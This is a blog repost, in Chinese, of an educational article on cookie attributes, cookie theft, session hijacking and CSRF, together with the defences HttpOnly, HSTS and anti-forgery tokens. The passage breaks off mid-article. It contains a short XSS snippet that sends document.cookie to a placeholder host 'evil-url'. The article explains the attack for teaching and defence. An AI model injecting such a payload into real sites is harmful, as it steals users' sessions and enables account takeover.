然后现实很残酷，很多站点根本无法做到所有的请求都走https。原因有很多，可能是成本考虑，可能是业务需求。 防御2 设置Strict-Transport-Security header，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。更多点此 乌云案例思考如果偷取cookie失败，无法session劫持，攻击者如何再发起攻击？劫持session的目的是拿到登录态，从而获得服务器授权做很多请求，例如账户变更。如果劫持不到session，也能够做授权请求不是也达到攻击的目的了？无需拿到session cookie，跨站发起请求就可以了，这就是CSRF！server通过把用户凭证存储在cookie以维持session，http/https协议每次访问都会自动传输cookie，协议上的缺陷是导致可进行CSRF攻击的根本原因！防御方式：使用anti-forgery token大部分攻击都是提权行为，最基本的提权通过偷取用户名密码，不成功转而窃取session，窃取不成转而跨站攻击，实在不行重放也可以造成危害原文地址：http://shaoshuai.me/tech/2014/08/16/cookie-theft-and-session-hijacking.html","@type":"BlogPosting","headline":"cookie窃取和session劫持-WEB前端开发","dateModified":"2020-07-07T00:00:00+08:00","datePublished":"2020-07-07T00:00:00+08:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <script>
+    // 百度统计代码
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?ccd4104a124f2218d64c124431d52789";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+
+    <script>
+    // google analytics
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-163446273-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+
+
+
+</head>
+
+
+<body>
+
+  <header id="top">
+    <div class="wrapper">
+        <a href="/" class="brand">TLDSN</a>
+        <small>太阳升起时，请重新开始</small>
+        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
+        <nav id="headerNav">
+            <ul>
+                <li>
+                    
+                    <a href="/">
+                    
+                        <i class="fa fa-home"></i>Home
+                    </a>
+                </li>
+
+                
+                    
+                    <li>
+                        
+                        <a href="/archive/">
+                        
+                            <i class="fa fa-archive"></i>Archives
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/category/">
+                        
+                            <i class="fa fa-th-list"></i>Categories
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tag/">
+                        
+                            <i class="fa fa-tags"></i>Tags
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/collection/">
+                        
+                            <i class="fa fa-bookmark"></i>Collections
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/todo/">
+                        
+                            <i class="fa fa-check-square-o"></i>Todo
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/note/">
+                        
+                            <i class="fa fa-code"></i>Note
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/about/">
+                        
+                            <i class="fa fa-heart"></i>About
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/authors/">
+                        
+                            <i class="fa fa-"></i>Staff
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+  <div class="page clearfix" post>
+    <div class="left">
+        <h1>cookie窃取和session劫持-WEB前端开发</h1>
+        <div class="label">
+
+            <div class="label-card">
+                <i class="fa fa-calendar"></i>2020-07-07
+            </div>
+
+            <div class="label-card">
+                <!-- <i class="fa fa-user"></i>tldsn
+                 -->
+                
+                
+                  <a href="/authors/tldsn/"><i class="fa fa-user"></i>tldsn</a>
+                
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+            
+
+
+<!-- <span class="point">•</span> -->
+<span class="categories">
+  <i class="fa fa-th-list"></i>
+  
+    
+        <a href="/category/#印象笔记导入" title="Category: 印象笔记导入" rel="category">印象笔记导入</a>
+    
+  
+
+  <!-- <span class="point">•</span> -->
+</span>
+
+
+            </div>
+
+            <div class="label-card">
+            
+<!-- <span class="point">•</span> -->
+<span class="pageTag">
+  <i class="fa fa-tags"></i>
+  
+    
+  
+
+</span>
+
+            </div>
+
+        </div>
+        <hr>
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+        <html><head></head><body><div class="ennote"><div><br></div><div style="min-width: 100%;"><div style="background-color: transparent; vertical-align: baseline;"><div style="background-color: transparent; vertical-align: baseline; text-align: left;"><div style="margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;"><div style="margin: 0px auto; padding: 0px 2em; border: 0px none; vertical-align: baseline; z-index: 200; position: relative; width: 36em;"><div style="margin: 0px 25px 0px -25px; padding: 0px; border: 0px none; vertical-align: baseline; position: relative;"><div style="margin: 0px; padding: 0px 0px 9em; border: 0px none; vertical-align: baseline; position: relative;"><div style="margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><div style="margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; position: relative;"><div style="margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;"><div style="font-size: inherit; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;"><h1 style="border: 0px none; vertical-align: baseline; text-align: left; font-size: 35px; padding: 0px; margin: 0px;"><span style="font-size: 35px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">cookie窃取和session劫持</span></h1><div style="padding: 1.5em 0px; border: 0px none; font-size: inherit; vertical-align: baseline; position: relative; height: 1em; text-align: center; margin: 0px;"><div style="padding:0px;border:0px none;font:inherit;vertical-align:baseline;position:absolute;left:-4em;top:50%;z-index:10;width:100%;padding-left:4em;padding-right:4em;height:0.1em;opacity:0.5;margin:0px;background:rgba(0, 0, 0, 0) -webkit-linear-gradient(0deg, rgb(243, 242, 238) 1%, rgb(31, 9, 9) 50%, rgb(243, 242, 238) 99%) repeat scroll 0% 0%;margin-bottom:0px;"></div></div></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">2014-08-18</span> <span style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">分类：<a href="https://www.html.cn/archives/category/develop-message" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">前端工具资源</a></span> <span style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">阅读(59523)</span> <span style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">评论(0)</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">Updates</span></div><ul style="font-size: inherit; padding: 0px; border: 0px none; vertical-align: baseline; margin: -1em 0px 1.5em 1.5em; list-style: disc;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">2014-08-17 感谢</span><a href="http://weibo.com/276653168" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">@搞前端的crosser</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">的提醒，加入了HTTP Response Splitting的内容。</span></div></li></ul><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">此篇文章的Presentation</span><a href="https://speakerdeck.com/shawn0102/cookie-theft-and-session-hijacking-1" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">戳这里</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">。</span></div><h2 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: bold;">一、cookie的基本特性</span></h2><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">如果不了解cookie，可以先到</span><a href="http://en.wikipedia.org/wiki/HTTP_cookie" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">wikipedia</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">上学习一下。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">http request</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">浏览器向服务器发起的每个请求都会带上cookie：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Host: www.example.org</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Cookie: foo=value1;bar=value2</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Accept: */*</span></div></li></ol></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">http response</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">服务器给浏览器的返回可以设置cookie：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">HTTP/1.1 200 OK</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Content-type: text/html</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Set-Cookie: name=value</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Set-Cookie: name2=value2; Expires=Wed,09 June 2021 10:18:32 GMT</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">(content of page)</span></div></li></ol></div><h2 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: bold;">二、cookie有关的术语</span></h2><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">session cookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">当cookie没有设置超时时间，那么cookie会在浏览器退出时销毁，这种cookie是session cookie。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">persistent cookie/tracking cookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">设置了超时时间的cookie，会在指定时间销毁，cookie的维持时间可以持续到浏览器退出之后，这种cookie被持久化在浏览器中。很多站点用cookie跟踪用户的历史记录，例如广告类站点会使用cookie记录浏览过哪些内容，搜索引擎会使用cookie记录历史搜索记录，这时也可以称作tracking cookie，因为它被用于追踪用户行为。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">secure cookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">服务器端设置cookie的时候，可以指定</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">secure</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">属性，这时cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有secure cookie。设置secure cookie的方式举例：</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Set-Cookie: foo=bar; Path=/; Secure</span></div></li></ol></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">HttpOnly cookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">服务器端设置cookie的时候，也可以指定一个</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">HttpOnly</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">属性。</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">html 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">Set-Cookie: foo=bar; Path=/; HttpOnly</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">设置了这个属性的cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">third-party cookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">第三方cookie的使用场景通常是iframe，例如www.a.com潜入了一个www.ad.com的广告iframe，那么www.ad.com设置的cookie属于不属于www.a.com，被称作第三方cookie。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">supercookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">cookie会从属于一个域名，例如www.a.com，或者属于一个子域，例如b.a.com。但是如果cookie被声明为属于.com会发生什么？这个cookie会在任何.com域名生效。这有很大的安全性问题。这种cookie被称作supercookie。浏览器做出了限制，不允许设置顶级域名cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。现代主流浏览器都很好的处理了supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对supercookie进行攻击啦。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">zombie cookie/evercookie</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">僵尸cookie是指当用户通过浏览器的设置清除cookie后可以自动重新创建的cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当cookie被删除时，从其他存储中恢复。 evercookie是实现僵尸cookie的主要技术手段。 了解</span><a href="http://en.wikipedia.org/wiki/Zombie_cookie" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">僵尸cookie</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">和</span><a href="http://en.wikipedia.org/wiki/Evercookie" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">evercookie</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">。</span></div><h2 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: bold;">三、cookie有什么用</span></h2><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">通常cookie有三种主要的用途。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">session管理</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是</span><a href="http://en.wikipedia.org/wiki/Basic_access_authentication" style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; font-family: &quot;PT Serif&quot;; line-height: 1.5em; color: rgb(6, 85, 136); text-decoration: none;" target="_blank">Base Auth</a><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">，但是这种方式，用户名和密码在每次请求中都会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。所以现在大多数站点采用基于cookie的session管理方式：用户登陆成功后，设置一个唯一的cookie标识本次会话，基于这个标识进行用户授权。只要请求中带有这个标识，都认为是登录态。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">个性化</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。以前Google退出的iGoogle产品也是一个典型的例子，用户可以拥有自己的Google自定制主页，其中就使用了cookie。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">user tracking</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">cookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。</span></div><h2 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: bold;">四、cookie窃取和session劫持</span></h2><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">本文就cookie的三种用途中session管理的安全问题进行展开。 既然cookie用于维持会话，如果这个cookie被攻击者窃取会发生什么？session被劫持！ 攻击者劫持会话就等于合法登录了你的账户，可以浏览大部分用户资源。</span></div><h3 style="font-size: 30px; margin: 35px 0px 15px; padding: 0px; border: 0px none; vertical-align: baseline; text-align: left;"><span style="font-size: 30px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 35px; font-weight: normal;">最基本的cookie窃取方式：xss漏洞</span></h3><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">攻击</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">一旦站点中存在可利用的xss漏洞，攻击者可直接利用注入的js脚本获取cookie，进而通过异步请求把标识session id的cookie上报给攻击者。</span></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">js 代码:</span></div><div style="font-size: 0.875em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline; background-color: rgb(243, 242, 238); width: auto;"><ol style="padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; margin: 0px 0px 1.5em 1.5em; list-style: decimal;"><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">var img = document.createElement('img');</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">img.src ='http://evil-url?c='+ encodeURIComponent(document.cookie);</span></div></li><li style="margin: 0px; padding: 0px; border: 0px none; font-size: inherit; vertical-align: baseline; list-style-type: inherit; list-style-position: outside;"><div><span style="color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em;">document.getElementsByTagName('body')[0].appendChild(img);</span></div></li></ol></div><div style="font-size: inherit; margin: 0px 0px 1.5em; padding: 0px; border: 0px none; vertical-align: baseline;"><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">如何寻找XSS漏洞是另外一个话题了，自行google之。</span> <span style="font-size: inherit; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em; font-weight: bold; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">防御</span> <span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">根据上面</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">HttpOnly cookie</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">的介绍，一旦一个cookie被设置为</span><span style="font-size: 0.875em; color: rgb(31, 9, 9); font-family: Inconsolata; line-height: 1.71429em; margin: 0px; padding: 0px; border: 0px none; vertical-align: baseline;">HttpOnly</span><span style="font-size: 16px; color: rgb(31, 9, 9); font-family: &quot;PT Serif&quot;; line-height: 1.5em;">，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个cookie进行session维持，但客户端js对其不可见。那么即使存在xss漏洞也无法简单的利用其进行session劫持攻击了。 但是上面说的是无法利用xss进行简单的攻击，但是也不是没有办法的。既然无法使用</span><span style="font-size: 